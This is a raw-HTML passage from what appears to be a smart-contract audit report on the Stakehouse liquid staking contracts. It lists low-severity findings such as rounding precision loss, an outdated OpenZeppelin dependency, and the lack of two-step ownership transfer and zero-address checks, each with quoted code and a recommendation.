</span><span class=\"mtk12\">status</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">syndicate</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Syndicate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">147</span><span class=\"mtk1\">:     ) </span><span class=\"mtk12\">external</span><span class=\"mtk1\"> </span><span class=\"mtk12\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">154</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deRegisterKnots</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blsPublicKeys</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">161</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addPriorityStakers</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_priorityStakers</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">168</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updatePriorityStakingBlock</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_endBlock</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><strong>Recommendation:</strong><br>\nWe recommend to either reimplement the function to disable it or to clearly specify if it is part of the contract design.</p>\n<h2 id=\"l-07-loss-of-precision-due-to-rounding\" style=\"position:relative;\"><a href=\"#l-07-loss-of-precision-due-to-rounding\" aria-label=\"l 07 loss of precision due to rounding permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-07] Loss of precision due to rounding</h2>\n<p>Due to <code>/ PRECISION</code>, users can avoid paying fee if <code>claimed [][]</code> result is below PRECISION</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"158\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">liquid</span><span class=\"mtk1\">-</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GiantMevAndFeesPool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">199</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">200</span><span class=\"mtk1\">:     </span><span class=\"mtk3\">/// @dev Internal re-usable method for setting claimed to max for msg.sender</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">201</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_setClaimedToMax</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_user</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">202</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// New ETH stakers are not entitled to ETH earned by</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">203</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">claimed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">][</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lpTokenETH</span><span class=\"mtk1\">)] = (</span><span class=\"mtk12\">accumulatedETHPerLPShare</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">lpTokenETH</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">)) / </span><span class=\"mtk12\">PRECISION</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">204</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p><strong>Recommendation:</strong><br>\nA lower limit can be added to the <code>claimed</code> values</p>\n<h2 id=\"l-08-using-vulnerable-dependency-of-openzeppelin\" style=\"position:relative;\"><a href=\"#l-08-using-vulnerable-dependency-of-openzeppelin\" aria-label=\"l 08 using vulnerable dependency of openzeppelin permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-08] Using vulnerable dependency of OpenZeppelin</h2>\n<p>The package.json configuration file says that the project is using 4.5.0 of OZ which has a not last update version</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"159\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">result</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">file</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">package</span><span class=\"mtk1\">.</span><span class=\"mtk12\">json</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">10</span><span class=\"mtk1\">:   </span><span class=\"mtk8\">&quot;dependencies&quot;</span><span class=\"mtk1\">: {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">14</span><span class=\"mtk12\">:</span><span class=\"mtk1\">     </span><span class=\"mtk8\">&quot;@openzeppelin/contracts&quot;</span><span class=\"mtk1\">: </span><span class=\"mtk8\">&quot;^4.5.0&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">15</span><span class=\"mtk12\">:</span><span class=\"mtk1\">     </span><span class=\"mtk8\">&quot;@openzeppelin/contracts-upgradeable&quot;</span><span class=\"mtk1\">: </span><span class=\"mtk8\">&quot;4.5.0&quot;</span><span class=\"mtk1\">,</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"160\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">VULNERABILITY</span><span class=\"mtk1\">\t</span><span class=\"mtk12\">VULNERABLE</span><span class=\"mtk1\"> </span><span class=\"mtk12\">VERSION</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">H</span><span class=\"mtk1\">    \t</span><span class=\"mtk12\">Improper</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Verification</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Cryptographic</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Signature</span><span class=\"mtk1\">\t&lt;</span><span class=\"mtk7\">4.7</span><span class=\"mtk1\">.</span><span class=\"mtk7\">3</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">M</span><span class=\"mtk1\">   \t</span><span class=\"mtk12\">Denial</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Service</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">DoS</span><span class=\"mtk1\">)\t&gt;=</span><span class=\"mtk7\">2.3</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &lt;</span><span class=\"mtk7\">4.7</span><span class=\"mtk1\">.</span><span class=\"mtk7\">2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">L</span><span class=\"mtk1\">     \t</span><span class=\"mtk12\">Incorrect</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Resource</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Transfer</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Between</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Spheres</span><span class=\"mtk1\">\t &gt;=</span><span class=\"mtk7\">4.6</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &lt;</span><span class=\"mtk7\">4.7</span><span class=\"mtk1\">.</span><span class=\"mtk7\">2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">H</span><span class=\"mtk1\">\t</span><span class=\"mtk12\">Incorrect</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Calculation</span><span class=\"mtk1\">\t&gt;=</span><span class=\"mtk7\">4.3</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &lt;</span><span class=\"mtk7\">4.7</span><span class=\"mtk1\">.</span><span class=\"mtk7\">2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">H</span><span class=\"mtk1\">\t</span><span class=\"mtk12\">Information</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Exposure</span><span class=\"mtk1\">\t&gt;=</span><span class=\"mtk7\">4.1</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &lt;</span><span class=\"mtk7\">4.7</span><span class=\"mtk1\">.</span><span class=\"mtk7\">1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">H</span><span class=\"mtk1\">\t</span><span class=\"mtk12\">Information</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Exposure</span><span class=\"mtk1\">\t&gt;=</span><span class=\"mtk7\">4.0</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &lt;</span><span class=\"mtk7\">4.7</span><span class=\"mtk1\">.</span><span class=\"mtk7\">1</span></span></span></code></pre>\n<p><strong>Recommendation:</strong><br>\nUse patched versions<br>\nLatest non vulnerable version 4.8.0</p>\n<h2 id=\"l-09-use-safetransferownership-instead-of-transferownership-function\" style=\"position:relative;\"><a href=\"#l-09-use-safetransferownership-instead-of-transferownership-function\" aria-label=\"l 09 use safetransferownership instead of transferownership function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-09] Use <code>safeTransferOwnership</code> instead of <code>transferOwnership</code> function</h2>\n<p><strong>Context:</strong><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L6\">LiquidStakingManager.sol#L6</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L8\">Syndicate.sol#L8</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"161\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">wallet</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OwnableSmartWallet</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">93</span><span class=\"mtk1\">      </span><span class=\"mtk3\">/// @inheritdoc IOwnableSmartWallet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">94</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">transferOwnership</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newOwner</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   95:         </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   96:         </span><span class=\"mtk11\">override</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IOwnableSmartWallet</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Ownable</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   97:     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">98</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// Only the owner themselves or an address that is approved for transfers</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">99</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// is authorized to do this</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">100</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">101</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">isTransferApproved</span><span class=\"mtk1\">(</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">102</span><span class=\"mtk1\">:             </span><span class=\"mtk8\">&quot;OwnableSmartWallet: Transfer is not allowed&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">103</span><span class=\"mtk1\">:         ); </span><span class=\"mtk3\">// F: [OSW-4]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">104</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">105</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// Approval is revoked, in order to avoid unintended transfer allowance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">106</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// if this wallet ever returns to the previous owner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">107</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">owner</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">108</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">_setApproval</span><span class=\"mtk1\">(</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// F: [OSW-5]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">109</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">110</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">_transferOwnership</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newOwner</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// F: [OSW-5]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">111</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p><strong>Description:</strong><br>\n<code>transferOwnership</code> function is used to change Ownership</p>\n<p>Use a 2 structure transferOwnership which is safer.<br>\n<code>safeTransferOwnership</code>,  use it is more secure due to 2-stage ownership transfer.</p>\n<p><strong>Recommendation:</strong><br>\nUse <code>Ownable2Step.sol</code><br>\n<a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol\">Ownable2Step.sol</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"162\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> The new owner accepts the ownership transfer.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">acceptOwnership</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">pendingOwner</span><span class=\"mtk1\">() == </span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Ownable2Step: caller is not the new owner&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_transferOwnership</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h2 id=\"n-01-0-address-check\" style=\"position:relative;\"><a href=\"#n-01-0-address-check\" aria-label=\"n 01 0 address check permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-01] <code>0 address</code> check</h2>\n<p>0 address control should be done in these parts;</p>\n<p><strong>Context:</strong><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantLP.sol#L20-L21\">GiantLP.sol#L20-L21</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L170-L177\">LiquidStakingManager.sol#L170-L177</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LPToken.sol#L33-L34\">LPToken.sol#L33-L34</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/OptionalHouseGatekeeper.sol#L15\">OptionalHouseGatekeeper.sol#L15</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SavETHVault.sol#L45\">SavETHVault.sol#L45</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/Syndicate.sol#L130\">Syndicate.sol#L130</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/syndicate/SyndicateFactory.sol#L17\">SyndicateFactory.sol#L17</a></p>\n<p><strong>Recommendation:</strong><br>\nAdd code like this;<br>\n<code>if (oracle == address(0)) revert ADDRESS_ZERO();</code></p>\n<h2 id=\"n-02-add-parameter-to-event-emit\" style=\"position:relative;\"><a href=\"#n-02-add-parameter-to-event-emit\" aria-label=\"n 02 add parameter to event emit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-02] Add parameter to Event-Emit</h2>\n<p>Some event-emit description hasn’t parameter. Add to parameter  for front-end website or client app , they can has that something has happened on the blockchain.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"163\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">syndicate</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Syndicate</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">468</span><span class=\"mtk1\">      </span><span class=\"mtk3\">/// @dev Internal logic for initializing the syndicate contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">469</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_initialize</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  470:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_contractOwner</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  471:         </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_priorityStakingEndBlock</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  472:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_priorityStakers</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  473:         </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_blsPubKeysForSyndicateKnots</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">474</span><span class=\"mtk1\">:     ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">475</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// Transfer ownership from the deployer to the address specified as the owner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">476</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">_transferOwnership</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_contractOwner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">477</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">478</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// Add the initial set of knots to the syndicate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">479</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">_registerKnotsToSyndicate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_blsPubKeysForSyndicateKnots</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span 